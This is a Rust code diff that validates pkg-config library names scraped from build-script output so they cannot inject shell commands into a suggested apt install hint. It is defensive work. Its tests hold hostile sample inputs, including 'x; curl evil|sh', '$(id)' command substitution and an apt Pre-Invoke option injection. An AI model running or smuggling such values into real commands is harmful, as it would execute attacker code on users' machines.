@@ -535,6 +535,43 @@ impl FfiCache {
 
 // ── pkg-config missing-library detection ────────────────────────────────────
 
+/// The longest `pkg-config` library name [`SysLibName::parse`] accepts.
+pub const SYS_LIB_NAME_MAX_LEN: usize = 128;
+
+/// A `pkg-config` library name in the `pkg-config` charset, safe to place in a suggested shell command.
+///
+/// ASCII letters, digits, and `.`, `_`, `+`, `-`, opening with a letter or
+/// digit (so it never reads as a command-line option), at most
+/// [`SYS_LIB_NAME_MAX_LEN`] bytes. The name is scraped from untrusted
+/// build-script output and lands inside an `apt install …` line the user may
+/// copy and run; a value that holds a shell metacharacter or whitespace has no
+/// representation, so no install hint can carry one.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SysLibName(String);
+
+impl SysLibName {
+    /// Parse `raw`, or `None` when it falls outside the `pkg-config` charset or length bound.
+    #[must_use]
+    pub fn parse(raw: &str) -> Option<Self> {
+        let opens_with_alphanumeric = raw
+            .chars()
+            .next()
+            .is_some_and(|c| c.is_ascii_alphanumeric());
+        let legal = opens_with_alphanumeric
+            && raw.len() <= SYS_LIB_NAME_MAX_LEN
+            && raw
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'));
+        legal.then(|| Self(raw.to_owned()))
+    }
+
+    /// The parsed name.
+    #[must_use]
+    pub fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
 /// A parsed pkg-config "not found" failure: the missing system library and
 /// the Rust crate whose build script reported it.
 ///
@@ -542,22 +579,32 @@ impl FfiCache {
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct MissingSystemLib {
     /// The `pkg-config` library name (e.g. `wayland-client`).
-    pub system_lib: String,
-    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`).
-    pub crate_name: String,
+    pub system_lib: SysLibName,
+    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`), when the
+    /// failure named one that parses as a crate name.
+    pub crate_name: Option<CrateName>,
 }
 
-/// Trim and strip control characters from a name extracted out of raw
-/// build-script stderr. A system-library or crate name is rendered into a styled
-/// diagnostic; an ANSI escape or other control byte carried in the raw stderr
-/// must not reach the terminal and forge markup, so it is removed at the parse
-/// boundary (the typed value downstream is always terminal-safe).
+/// Trim and strip control characters from a name extracted out of raw build-script stderr.
+///
+/// An ANSI escape or other control byte carried in the raw stderr is removed
+/// before the name is parsed, so the parse sees the characters a terminal
+/// would show.
 fn sanitize_extracted_name(raw: &str) -> String {
     TerminalSafe::sanitize(raw.trim())
         .as_str()
         .chars()
         .filter(|&c| c != '\n' && c != '\t')
         .collect()
+}
+
+/// Parse a missing-library failure's two names, or `None` when the library name does not parse.
+fn missing_system_lib(sys_lib: &str, crate_name: Option<&str>) -> Option<MissingSystemLib> {
+    Some(MissingSystemLib {
+        system_lib: SysLibName::parse(&sanitize_extracted_name(sys_lib))?,
+        crate_name: crate_name
+            .and_then(|name| CrateName::parse(&sanitize_extracted_name(name)).ok()),
+    })
 }
 
 /// The raw inspector error channel from an inspection document, best-effort.
@@ -579,7 +626,9 @@ pub fn inspection_error_log(inspection_json: &str) -> Vec<String> {
 /// - Package `<lib>` was not found (or not found in the pkg-config search path)
 ///
 /// Returns `None` when no pkg-config signature is present (the failure has a
-/// different cause).
+/// different cause), or when the named library does not parse as a
+/// [`SysLibName`]: such a failure is summarised like any other, with no
+/// install hint.
 #[must_use]
 pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> {
     for line in errors {
@@ -589,10 +638,7 @@ pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> 
             && let Some((sys_lib, rest)) = rest.split_once("` required by crate `")
             && let Some((crate_name, _)) = rest.split_once("` was not found")
         {
-            return Some(MissingSystemLib {
-                system_lib: sanitize_extracted_name(sys_lib),
-                crate_name: sanitize_extracted_name(crate_name),
-            });
+            return missing_system_lib(sys_lib, Some(crate_name));
         }
         // Secondary form from pkg-config itself:
         // "Package '<lib>' was not found in the pkg-config search path."
@@ -602,12 +648,8 @@ pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> 
             && let Some(rest) = line.strip_prefix("Package '")
             && let Some((sys_lib, _)) = rest.split_once('\'')
         {
-            return Some(MissingSystemLib {
-                system_lib: sanitize_extracted_name(sys_lib),
-                // No crate name in this form — leave empty; the caller
-                // fills it from context when available.
-                crate_name: String::new(),
-            });
+            // No crate name in this form; the caller fills it from context.
+            return missing_system_lib(sys_lib, None);
         }
     }
     None
@@ -704,9 +746,11 @@ const PKG_CONFIG_INSTALL_HINTS: &[(&str, &str, &str, &str)] = &[
 ///
 /// Looks up `sys_lib` in the curated table first; falls back to a generic
 /// "install the `-dev` package that provides `<lib>.pc`" message when the
-/// library is not in the table.
+/// library is not in the table. Only a parsed [`SysLibName`] reaches the
+/// suggested command.
 #[must_use]
-pub fn install_hint_for(sys_lib: &str) -> String {
+pub fn install_hint_for(sys_lib: &SysLibName) -> String {
+    let sys_lib = sys_lib.as_str();
     for &(key, deb, fed, brew) in PKG_CONFIG_INSTALL_HINTS {
         if key == sys_lib {
             let mut parts: Vec<String> = Vec::new();
@@ -818,11 +862,9 @@ pub fn install_from_inspection(
         // caller and the CLI act on, not the raw string.
         if let Some(missing) = detect_missing_system_lib(pkg.errors()) {
             let install_hint = install_hint_for(&missing.system_lib);
-            let crate_name = if missing.crate_name.is_empty() {
-                pkg.name().to_owned()
-            } else {
-                missing.crate_name
-            };
+            let crate_name = missing
+                .crate_name
+                .map_or_else(|| pkg.name().to_owned(), |name| name.as_str().to_owned());
             return Err(Diagnostic::SystemLibraryNotFound {
                 system_lib: missing.system_lib,
                 crate_name,
@@ -2325,7 +2367,7 @@ mod tests {
                 .to_owned(),
         ];
         let got = detect_missing_system_lib(&errors).expect("must detect");
-        assert_eq!(got.system_lib, "wayland-client");
+        assert_eq!(got.system_lib.as_str(), "wayland-client");
         assert_eq!(got.crate_name, "wayland-sys");
     }
 
@@ -2336,7 +2378,7 @@ mod tests {
             "Package 'wayland-client' was not found in the pkg-config search path.".to_owned(),
         ];
         let got = detect_missing_system_lib(&errors).expect("must detect");
-        assert_eq!(got.system_lib, "wayland-client");
+        assert_eq!(got.system_lib.as_str(), "wayland-client");
     }
 
     #[test]
@@ -2353,14 +2395,15 @@ mod tests {
 
     #[test]
     fn install_hint_for_returns_curated_hint_for_known_lib() {
-        let hint = install_hint_for("wayland-client");
+        let hint = install_hint_for(&SysLibName::parse("wayland-client").expect("legal name"));
         assert!(hint.contains("wayland"), "{hint}");
         assert!(hint.contains("apt"), "{hint}");
     }
 
     #[test]
     fn install_hint_for_returns_generic_fallback_for_unknown_lib() {
-        let hint = install_hint_for("some-obscure-lib-xyz");
+        let hint =
+            install_hint_for(&SysLibName::parse("some-obscure-lib-xyz").expect("legal name"));
         assert!(
             hint.contains("some-obscure-lib-xyz"),
             "fallback must mention the lib name: {hint}"
@@ -2458,7 +2501,7 @@ mod tests {
                 crate_name,
                 ..
             } => {
-                assert_eq!(system_lib, "wayland-client");
+                assert_eq!(system_lib.as_str(), "wayland-client");
                 assert_eq!(crate_name, "wayland-sys");
             }
             other => panic!("expected SystemLibraryNotFound, got {other:?}"),
@@ -2485,9 +2528,81 @@ mod tests {
         let got = detect_missing_system_lib(&[line]).expect("signature matches");
         // `ESC l` is a two-byte escape sequence, dropped whole like every
         // escape `TerminalSafe` strips.
-        assert_eq!(got.system_lib, "wayand");
-        assert_eq!(got.crate_name, "wlsys");
-        assert!(!got.system_lib.contains('\u{1b}'));
+        assert_eq!(got.system_lib.as_str(), "wayand");
+        assert_eq!(
+            got.crate_name.as_ref().map(CrateName::as_str),
+            Some("wlsys")
+        );
+        assert!(!got.system_lib.as_str().contains('\u{1b}'));
+    }
+
+    /// A library name outside the `pkg-config` charset never reaches an install hint.
+    #[test]
+    fn a_hostile_system_lib_name_yields_no_install_hint() {
+        let over_length = "a".repeat(SYS_LIB_NAME_MAX_LEN + 1);
+        let hostile = [
+            "x; curl evil|sh",
+            "$(id)",
+            "`id`",
+            "lib foo",
+            "-o APT::Update::Pre-Invoke::=id",
+            over_length.as_str(),
+        ];
+        for name in hostile {
+            assert_eq!(SysLibName::parse(name), None, "{name:?} parsed");
+            let primary =
+                format!("The system library `{name}` required by crate `evil-sys` was not found.");
+            assert_eq!(
+                detect_missing_system_lib(&[primary]),
+                None,
+                "{name:?} detected"
+            );
+            let secondary =
+                format!("Package '{name}' was not found in the pkg-config search path.");
+            assert_eq!(
+                detect_missing_system_lib(&[secondary]),
+                None,
+                "{name:?} detected"
+            );
+        }
+        let longest = "a".repeat(SYS_LIB_NAME_MAX_LEN);
+        assert!(
+            SysLibName::parse(&longest).is_some(),
+            "the bound itself is legal"
+        );
+        assert!(SysLibName::parse("gtk+-3.0").is_some());
+        assert!(SysLibName::parse("libpipewire-0.3").is_some());
+    }
+
+    /// A hostile library name surfaces as the summarised inspector failure, never as a hint.
+    #[test]
+    fn install_from_inspection_gives_no_hint_for_a_hostile_system_lib() {
+        let json = serde_json::json!({
+            "pkg": "evil",
+            "name": "evil",
+            "version": "0.1.0",
+            "functions": [],
+            "errors": [
+                "The system library `x; curl evil|sh` required by crate `evil-sys` was not found."
+            ]
+        })
+        .to_string();
+        let tmp =
+            std::env::temp_dir().join(format!("ipe-ffi-syslib-hostile-{}", std::process::id()));
+        let cache = FfiCache::at_project_root(&tmp);
+        let err = install_from_inspection(&cache, &json).expect_err("must fail");
+        assert!(
+            matches!(err, crate::diag::Diagnostic::WireMalformed { .. }),
+            "expected a summarised failure, got {err:?}"
+        );
+    }
+
+    /// A crate name that does not parse falls back to the inspected package's name.
+    #[test]
+    fn a_hostile_crate_name_falls_back_to_the_package_name() {
+        let line = "The system library `zlib` required by crate `a b;c` was not found.".to_owned();
+        let got = detect_missing_system_lib(&[line]).expect("library parses");
+        assert_eq!(got.crate_name, None);
     }
 
     #[test]
